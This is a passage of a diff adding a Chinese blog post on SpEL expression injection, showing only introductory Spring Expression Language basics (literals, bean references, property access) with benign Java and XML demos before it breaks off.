@@ -1,0 +1,1145 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/0-11-%E6%AC%A7%E6%B6%A6%E5%90%89.png">
+  <link rel="icon" href="/img/0-11-%E6%AC%A7%E6%B6%A6%E5%90%89.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="linear-gradient(270deg, rgba(107,115,255,0.85), rgba(65,80,220,0.85), rgba(0,180,240,0.85), rgba(60,200,255,0.85), rgba(120,220,255,0.85), rgba(180,120,255,0.85), rgba(220,100,255,0.85), rgba(255,110,230,0.85), rgba(140,100,255,0.85), rgba(100,150,255,0.85), rgba(70,200,220,0.85), rgba(107,115,255,0.85))">
+  <meta name="author" content="Xvsf">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="SpEL 表达式注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SpEL 表达式注入">
+<meta property="og:url" content="http://xvshifu.github.io/2025/11/17/SpEL%20%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Xvsf blogs">
+<meta property="og:description" content="SpEL 表达式注入">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171207819.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171209680.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171209529.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171209602.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171210056.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171210814.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171210366.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171210329.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171210399.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171210485.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171210385.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171210844.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171210844.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171211140.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/52403351/1763347727567-4de57c46-67e3-4fd3-8abb-6d99a6478d3b.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171211770.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171211478.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171211117.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171211346.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171211129.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171211129.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171211750.png">
+<meta property="article:published_time" content="2025-11-17T03:00:00.000Z">
+<meta property="article:modified_time" content="2025-11-17T04:14:33.958Z">
+<meta property="article:author" content="Xvsf">
+<meta property="article:tag" content="SpEL 表达式注入">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171207819.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>SpEL 表达式注入 - Xvsf blogs</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/xm_custom/custom.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xvshifu.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"0wmNTqqCOUst92FKToSXxgvQ-gzGzoHsz","app_key":"p527aBaA4G01EJdMOVMGXsHR","server_url":"https://0wmntqqc.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>🖋️ Hello My Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-steam"></i>
+                <span>game</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/mf" target="_self">
+                    
+                    <span>魔方</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/sl" target="_self">
+                    
+                    <span>扫雷</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/2048" target="_self">
+                    
+                    <span>2048</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/wzq" target="_self">
+                    
+                    <span>五子棋</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/txz" target="_self">
+                    
+                    <span>推箱子</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/dblk" target="_self">
+                    
+                    <span>躲避绿块</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/catch-the-cat-master" target="_self">
+                    
+                    <span>围住小猫</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/clock/0" target="_self">
+                    
+                    <span>时钟1</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/clock/1" target="_self">
+                    
+                    <span>时钟2</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/banner02.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="SpEL 表达式注入"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-11-17 11:00" pubdate>
+          2025年11月17日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          43 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">SpEL 表达式注入</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2025年11月17日 中午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="SpEL-表达式注入"><a href="#SpEL-表达式注入" class="headerlink" title="SpEL 表达式注入"></a>SpEL 表达式注入</h1><h1 id="1、SpEL-基础"><a href="#1、SpEL-基础" class="headerlink" title="1、SpEL 基础"></a>1、SpEL 基础</h1><h2 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1 简介"></a>1.1 简介</h2><p>在 Spring3 中引入了 Spring 表达式语言（Spring Expression Language，简称 SpEL），是一种强大的<strong>运行时查询和操作对象图的语言</strong>，语法类似于Jakarta表达语句，但额外支持方法调用和基本字符串模板。SpEL旨在为Spring社区提供一种统一且功能全面的表达式语言，适用于所有Spring产品，并根据这些产品的需要设计了其特性。尽管SpEL是Spring框架的一部分，但它可以独立于Spring使用。通常情况下，用户只需编写简单的表达式字符串即可利用SpEL的功能，无需关心底层架构细节。例如，在基于XML或注解的bean定义中集成SpEL就是一个常见应用。</p>
+<p>SpEL 表达式必须使用占位符语法 <code>#{SpelExpression}</code>，以便它们可以嵌入到纯文本字符串中（换句话说，SpEL 启用了表达式模板）。</p>
+<p>SpEL 还可使用 <code>@BeanID语法在注册表中查找 Bean</code> （通常是 Spring 注册表）。例如，使用 ID、<code>headerUtils</code> 和方法 <code>count （）</code> （计数当前消息中的标头数）指定 bean，可以在 SpEL predicate 中使用 <code>headerUtils</code> bean，如下所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">#&#123;@headerUtils.count &gt; 4&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="1-2-表达式类型"><a href="#1-2-表达式类型" class="headerlink" title="1.2 表达式类型"></a>1.2 表达式类型</h2><h3 id="1-2-1-字面值"><a href="#1-2-1-字面值" class="headerlink" title="1.2.1 字面值"></a>1.2.1 字面值</h3><p>最简单的 SpEL 表达式就是仅包含一个字面值。</p>
+<p>下面我们在 XML 配置文件中使用 SpEL 设置类属性的值为字面值，此时需要用到 <code>#{}</code> 定界符，注意若是指定为字符串的话需要添加单引号括起来：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;message1&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;#&#123;666&#125;&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;message1&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;#&#123;aaaa&#125;&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>还可以直接与字符串混用：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;message1&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;the value is #&#123;666&#125;&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="1-2-2-Demo"><a href="#1-2-2-Demo" class="headerlink" title="1.2.2 Demo"></a>1.2.2 Demo</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.basicspel;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloWorld</span> &#123;<br>    <span class="hljs-keyword">private</span> String message;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setMessage</span><span class="hljs-params">(String message)</span> &#123;<br>        <span class="hljs-built_in">this</span>.message = message;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getMessage</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Your Message :&quot;</span> + message);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.basicspel;<br><br><span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;<br><span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;<br><span class="hljs-keyword">import</span> org.springframework.context.ApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;<br><br><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BasicSpElApplication</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(<span class="hljs-string">&quot;Demo.xml&quot;</span>);<br>        <span class="hljs-type">HelloWorld</span> <span class="hljs-variable">helloWorld</span> <span class="hljs-operator">=</span> context.getBean(<span class="hljs-string">&quot;helloWorld&quot;</span>, HelloWorld.class);<br>        helloWorld.getMessage();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="hljs-tag">  http://www.springframework.org/schema/beans/spring-beans-3.0.xsd &quot;</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;helloWorld&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.src.basicspel.HelloWorld&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;message&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;#&#123;&#x27;aaa&#x27;&#125; is #&#123;3333&#125;&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171207819.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>参考 Drunkbaby 师傅的文章：</p>
+<h2 id="1-3-引用-Bean"><a href="#1-3-引用-Bean" class="headerlink" title="1.3 引用 Bean"></a>1.3 引用 Bean</h2><p>SpEl 表达式能够通过其他 Bean 的 ID 进行引用，直接在 #{} 符号中写入 ID 名即可，无需添加单引号：</p>
+<p>原来的写法：<code>&lt;constructor-arg ref=&quot;test&quot;/&gt;</code></p>
+<p>在 SpEL 中：<code>&lt;constructor-arg value=&quot;#{test}&quot;&gt;</code></p>
+<h3 id="1-3-1-Demo"><a href="#1-3-1-Demo" class="headerlink" title="1.3.1 Demo"></a>1.3.1 Demo</h3><p>SpellChecker.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.basicspel;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpellChecker</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SpellChecker</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Inside SpellChecker constructor.&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkSpelling</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Inside checkSpelling.&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>TextEditor.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.basicspel;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TextEditor</span> &#123;<br>    <span class="hljs-keyword">private</span> SpellChecker spellChecker;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TextEditor</span><span class="hljs-params">(SpellChecker spellChecker)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Inside TextEditor constructor.&quot;</span> );<br>        <span class="hljs-built_in">this</span>.spellChecker = spellChecker;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">spellCheck</span><span class="hljs-params">()</span> &#123;<br>        spellChecker.checkSpelling();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>RefSpellAndEditor.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.basicspel;<br><br><span class="hljs-keyword">import</span> org.springframework.context.ApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RefSpellAndEditor</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(<span class="hljs-string">&quot;editor.xml&quot;</span>);<br>        <span class="hljs-type">TextEditor</span> <span class="hljs-variable">editor</span> <span class="hljs-operator">=</span> context.getBean(<span class="hljs-string">&quot;textEditor&quot;</span>, TextEditor.class);<br>        editor.spellCheck();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>editor.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="hljs-tag">  http://www.springframework.org/schema/beans/spring-beans-3.0.xsd &quot;</span>&gt;</span><br><br>  <span class="hljs-comment">&lt;!-- Definition for spellChecker bean --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;spellChecker&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.src.basicspel.SpellChecker&quot;</span> /&gt;</span><br><br>  <span class="hljs-comment">&lt;!-- Definition for textEditor bean --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;textEditor&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.src.basicspel.TextEditor&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--&lt;constructor-arg ref=&quot;spellChecker&quot;/&gt;--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;#&#123;spellChecker&#125;&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171209680.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="1-4-引用类属性"><a href="#1-4-引用类属性" class="headerlink" title="1.4  引用类属性"></a>1.4  引用类属性</h2><p>SpEL 表达式能够访问类的属性。</p>
+<p>比如， 参赛者 Drunkbaby  是一位模仿高手，Johnford 唱什么歌，弹奏什么乐器，他就唱什么歌，弹奏什么乐器：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;kenny&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.spring.entity.Instrumentalist&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">p:song</span>=<span class="hljs-string">&quot;May Rain&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">p:instrument-ref</span>=<span class="hljs-string">&quot;piano&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;Drunkbaby&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.spring.entity.Instrumentalist&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span 